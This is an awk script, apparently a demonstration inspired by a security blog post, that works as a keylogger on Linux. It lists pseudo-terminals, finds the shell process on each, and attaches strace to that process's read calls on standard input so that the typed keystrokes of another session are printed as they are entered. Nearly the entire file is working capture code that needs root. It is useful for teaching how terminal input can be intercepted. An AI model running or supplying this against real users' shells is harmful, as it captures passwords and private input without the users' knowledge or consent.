#!/usr/bin/awk -f

# inspired by https://www.securitynik.com/2014/04/the-poor-mans-keylogger-strace.html

function print_help() {
    printf "This is a demo of how to use strace as a "
    printf "\"poor man's keylogger\".\n"
    printf "Usage: sudo ./strace_keylogger.awk <PID>\n"
    exit 1
}

function select_pts() {
    # prompt user for which pts they want to trace
    cmd="find /dev/pts/ -mindepth 1 -type c | grep -v '/dev/pts/ptmx' | sort -V"
    size = 0
    while( ( cmd | getline ) > 0 ) {
        pts[size++] = $0
    }
    close(cmd)
    for( i = 0; i < size; i++ ) {
        cmd = "sudo fuser " pts[i] " 2>/dev/null"; cmd | getline
        pids[i] = $1; close(cmd)
        cmd = "ps -h -p " pids[i] " -o cmd,user,etime"; cmd | getline
        proc_names[i] = $0; close(cmd)
    }

    for( i = 0; i < size; i++ ) {
        print i ":", pts[i], pids[i], proc_names[i]
        print "\tchild processes:"
        system("ps -h --ppid " pids[i] " -o cmd | sed 's/^/\t\t/g'")
    }
    printf "Enter a number to start tracing that shell process, or 'q' to quit: "
    getline selection < "-"

    if(selection == "q" || selection == "Q") {
        exit 0
    }

    if(selection ~ /[0-9]+/ && selection in pids) {
        return pids[selection]
    }
    else {
        print "Did not understand selection, aborting"
        exit 1
    }
}

BEGIN {
    # print "running as user " ENVIRON["USER"]
    if(ENVIRON["USER"] == "root" && (ARGC == 1 || ARGC == 2)) {
        if(ARGC == 1) {
            pid = select_pts()
        }
        else {
            if(ARGV[1] !~ /[0-9]+/) {
                print_help()
            }
            pid = ARGV[1]
        }
        FS=","
        cmd="strace -p " pid  " -tt -qq -f -e read 2>&1"
        while( ( cmd | getline ) > 0 ) {
            if($0 ~ /read\(0/ || $0 ~ /read\(.* 1\)/) {
                for(i = 1; i <= NF; i++) {
                    if($i ~ /read/) {
                        elem = $(i+1)
                        elem = substr(elem, 2)
                        if(elem == "\"\\r\"" ||
                           elem == "\"\\n\"" ||
                           elem == "\"\"") {
                            print elem
                        }
                        else {
                            printf elem ", "
                        }
                    }
                }
            }
        } 
        close(cmd)
    }
    else {
        print_help()
    }
}
